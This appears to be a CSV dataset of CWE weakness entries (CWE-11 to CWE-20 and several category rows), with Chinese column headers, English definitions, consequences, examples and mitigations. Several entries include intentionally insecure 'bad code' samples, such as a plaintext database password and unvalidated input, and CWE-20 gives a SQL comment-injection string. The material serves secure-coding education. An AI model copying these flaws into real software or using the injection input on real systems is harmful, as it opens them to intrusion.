cwe_vulnerabilities
名称,定义,常见后果,示范例子,可能的缓解方案
CWE-11: ASP.NET Misconfiguration: Creating Debug Binary,Debugging messages help attackers learn about the system and plan a form of attack.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataAttackers can leverage the additional information they gain from debugging output to mount attacks targeted on the framework, database, or other resources used by the application., Likelihood: ","Example 1The file web.config contains the debug mode setting. Setting debug to ""true"" will let the browser display debugging information.(bad code)Example Language:XML<?xml version=""1.0"" encoding=""utf-8"" ?><configuration><system.web><compilationdefaultLanguage=""c#""debug=""true""/>...</system.web></configuration>Change the debug mode to false when the application is deployed into production.",Phase:  System ConfigurationAvoid releasing debug binaries into the production environment. Change the debug mode to false when the application is deployed into production.
CWE-12: ASP.NET Misconfiguration: Missing Custom Error Page,An ASP .NET application must enable custom error pages in order to prevent attackers from mining information from the framework's built-in responses.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataDefault error pages gives detailed information about the error that occurred, and should not be used in production environments. Attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application., Likelihood: ","Example 1The mode attribute of the <customErrors> tag in the Web.config file defines whether custom or default error pages are used.In the following insecure ASP.NET application setting, custom error message mode is turned off. An ASP.NET error message with detailed stack trace and platform versions will be returned.(bad code)Example Language:ASP.NET<customErrors mode=""Off"" />A more secure setting is to set the custom error message mode for remote users only. No defaultRedirect error page is specified. The local user on the web server will see a detailed stack trace. For remote users, an ASP.NET error message with the server customError configuration setting and the platform version will be returned.(good code)Example Language:ASP.NET<customErrors mode=""RemoteOnly"" />Another secure option is to set the mode attribute of the <customErrors> tag to use a custom page as follows:(good code)Example Language:ASP.NET<customErrors mode=""On"" defaultRedirect=""YourErrorPage.htm"" />",Phase:  System ConfigurationHandle exceptions appropriately in source code. ASP .NET applications should be configured to use custom error pages instead of the framework default page.Phase:  Architecture and DesignDo not attempt to process an error or attempt to mask it.Phase:  ImplementationVerify return values are correct and do not supply sensitive information about the system.
CWE-13: ASP.NET Misconfiguration: Password in Configuration File,Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource making them an easy target for attackers.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ","Example 1The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database, but the pair is stored in plaintext.(bad code)Example Language:ASP.NET...<connectionStrings><add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" /></connectionStrings>...Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.","Phase:  ImplementationCredentials stored in configuration files should be encrypted, Use standard APIs and industry accepted algorithms to encrypt the credentials stored in configuration files."
CWE-14: Compiler Removal of Code to Clear Buffers,"Sensitive memory is cleared according to the source code, but compiler optimizations leave the memory untouched when it is not read from again, aka ""dead store removal.""","Scope: ConfidentialityAccess Control, Impact: Technical Impact:Read Memory; Bypass Protection MechanismThis weakness will allow data that has not been cleared from memory to be read. If this data contains sensitive password information, then an attacker can read the password and use the information to bypass protection mechanisms., Likelihood: ","Example 1The following code reads a password from the user, uses the password to connect to a back-end mainframe and then attempts to scrub the password from memory using memset().(bad code)Example Language:Cvoid GetData(char *MFAddr) {char pwd[64];if (GetPasswordFromUser(pwd, sizeof(pwd))) {if (ConnectToMainframe(MFAddr, pwd)) {// Interaction with mainframe}}memset(pwd, 0, sizeof(pwd));}The code in the example will behave correctly if it is executed verbatim, but if the code is compiled using an optimizing compiler, such as Microsoft Visual C++ .NET or GCC 3.x, then the call to memset() will be removed as a dead store because the buffer pwd is not used after its value is overwritten [18]. Because the buffer pwd contains a sensitive value, the application may be vulnerable to attack if the data are left memory resident. If attackers are able to access the correct region of memory, they may use the recovered password to gain control of the system.It is common practice to overwrite sensitive data manipulated in memory, such as passwords or cryptographic keys, in order to prevent attackers from learning system secrets. However, with the advent of optimizing compilers, programs do not always behave as their source code alone would suggest. In the example, the compiler interprets the call to memset() as dead code because the memory being written to is not subsequently used, despite the fact that there is clearly a security motivation for the operation to occur. The problem here is that many compilers, and in fact many programming languages, do not take this and other security concerns into consideration in their efforts to improve efficiency.Attackers typically exploit this type of vulnerability by using a core dump or runtime mechanism to access the memory used by a particular application and recover the secret information. Once an attacker has access to the secret information, it is relatively straightforward to further exploit the system and possibly compromise other resources with which the application interacts.","Phase:  ImplementationStore the sensitive data in a ""volatile"" memory location if available.Phase:  Build and CompilationIf possible, configure your compiler so that it does not remove dead stores.Phase:  Architecture and DesignWhere possible, encrypt sensitive data that are used by a software system."
CWE-15: External Control of System or Configuration Setting,One or more system settings or configuration elements can be externally controlled by a user.,"Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1The following C code accepts a number as one of its command line parameters and sets it as the host ID of the current machine.(bad code)Example Language:C...sethostid(argv[1]);...Although a process must be privileged to successfully invoke sethostid(), unprivileged users may be able to invoke the program. The code in this example allows user input to directly control the value of a system setting. If an attacker provides a malicious value for host ID, the attacker can misidentify the affected machine on the network or cause other unintended behavior.Example 2The following Java code snippet reads a string from an HttpServletRequest and sets it as the active catalog for a database Connection.(bad code)Example Language:Java...conn.setCatalog(request.getParameter(""catalog""));...In this example, an attacker could cause an error by providing a nonexistent catalog name or connect to an unauthorized portion of the database.","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.Phases:  Implementation; Architecture and DesignBecause setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control.Phases:  Implementation; Architecture and DesignIn general, do not allow user-provided or otherwise untrusted data to control sensitive values. The leverage that an attacker gains by controlling these values is not always immediately obvious, but do not underestimate the creativity of the attacker."
CWE CATEGORY: Configuration,Weaknesses in this category are typically introduced during the configuration of the software.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Code,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Source Code,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Data Processing Errors,Weaknesses in this category are typically found in functionality that processes data. Data processing is the manipulation of input to retrieve or save information.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-20: Improper Input Validation,"The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)An attacker could provide unexpected values and cause a program crash or excessive consumption of resources, such as memory and CPU., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Memory; Read Files or DirectoriesAn attacker could read confidential data if they are able to control resource references., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or CommandsAn attacker could use malicious input to modify data or possibly alter control flow in unexpected ways, including arbitrary command execution., Likelihood: ","Example 1This example demonstrates a shopping interaction in which the user is free to specify the quantity of items to be purchased and a total is calculated.(bad code)Example Language:Java...public static final double price = 20.00;int quantity = currentUser.getAttribute(""quantity"");double total = price * quantity;chargeUser(total);...The user has no control over the price variable, however the code does not prevent a negative value from being specified for quantity. If an attacker were to provide a negative value, then the user would have their account credited instead of debited.Example 2This example asks the user for a height and width of an m X n game board with a maximum dimension of 100 squares.(bad code)Example Language:C...#define MAX_DIM 100.../* board dimensions */int m,n, error;board_square_t *board;printf(""Please specify the board height: \n"");error = scanf(""%d"", &m);if ( EOF == error ){die(""No integer passed: Die evil hacker!\n"");}printf(""Please specify the board width: \n"");error = scanf(""%d"", &n);if ( EOF == error ){die(""No integer passed: Die evil hacker!\n"");}if ( m > MAX_DIM || n > MAX_DIM ) {die(""Value too large: Die evil hacker!\n"");}board = (board_square_t*) malloc( m * n * sizeof(board_square_t));...While this code checks to make sure the user cannot specify large, positive integers and consume too much memory, it does not check for negative values supplied by the user. As a result, an attacker can perform a resource consumption (CWE-400) attack against this program by specifying two, large negative values that will not overflow, resulting in a very large memory allocation (CWE-789) and possibly a system crash. Alternatively, an attacker can provide very large negative values which will cause an integer overflow (CWE-190) and unexpected behavior will follow depending on how the values are treated in the remainder of the program.Example 3The following example shows a PHP application in which the programmer attempts to display a user's birthday and homepage.(bad code)Example Language:PHP$birthday = $_GET['birthday'];$homepage = $_GET['homepage'];echo ""Birthday: $birthday<br>Homepage: <a href=$homepage>click here</a>""The programmer intended for $birthday to be in a date format and $homepage to be a valid URL. However, since the values are derived from an HTTP request, if an attacker can trick a victim into clicking a crafted URL with <script> tags providing the values for birthday and / or homepage, then the script will run on the client's browser when the web server echoes the content. Notice that even if the programmer were to defend the $birthday variable by restricting input to integers and dashes, it would still be possible for an attacker to provide a string of the form:(attack code)2009-01-09--If this data were used in a SQL statement, it would treat the remainder of the statement as a comment. The comment could disable other security-related logic in the statement. In this case, encoding combined with input validation would be a more useful protection mechanism.Furthermore, an XSS (CWE-79) attack or SQL injection (CWE-89) are just a few of the potential consequences when input validation is not used. Depending on the context of the code, CRLF Injection (CWE-93), Argument Injection (CWE-88), or Command Injection (CWE-77) may also be possible.Example 4The following example takes a user-supplied value to allocate an array of objects and then operates on the array.(bad code)Example Language:Javaprivate void buildList ( int untrustedListSize ){if ( 0 > untrustedListSize ){die(""Negative value supplied for list size, die evil hacker!"");}Widget[] list = new Widget [ untrustedListSize ];list[0] = new Widget();}This example attempts to build a list from a user-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown.Example 5This Android application has registered to handle a URL when sent an intent:(bad code)Example Language:Java...IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);...public class UrlHandlerReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {String URL = intent.getStringExtra(""URLToOpen"");int length = URL.length();...}}}The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.","Phase:  Architecture and DesignStrategy:  Attack Surface ReductionConsider using language-theoretic security (LangSec) techniques that characterize inputs using a formal language and build ""recognizers"" for that language. This effectively requires parsing to be a distinct layer that effectively enforces a boundary between raw input and internal data representations, instead of allowing parser code to be scattered throughout the program, where it could be subject to errors or inconsistencies that create weaknesses. [REF-1109] [REF-1110] [REF-1111]Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse an input validation framework such as Struts or the OWASP ESAPI Validation API. Note that using a framework does not automatically address all input validation problems; be mindful of weaknesses that could arise from misusing the framework itself (CWE-1173).Phases:  Architecture and Design; ImplementationStrategy:  Attack Surface ReductionUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Effectiveness: HighPhase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.Phase:  ImplementationWhen your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.Phase:  ImplementationBe especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow.Phase:  ImplementationDirectly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.Phase:  ImplementationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180,CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.Phase:  ImplementationWhen exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so."
CWE CATEGORY: DEPRECATED: Pathname Traversal and Equivalence Errors,"This category has been deprecated. It was originally used for organizing weaknesses involving file names, which enabled access to files outside of a restricted directory (path traversal) or to perform operations on files that would otherwise be restricted (path equivalence). Consider using either the File Handling Issues category (CWE-1219) or the class Use of Incorrectly-Resolved Name or Reference (CWE-706).",无常见后果信息,无示范例子,无可能的缓解方案
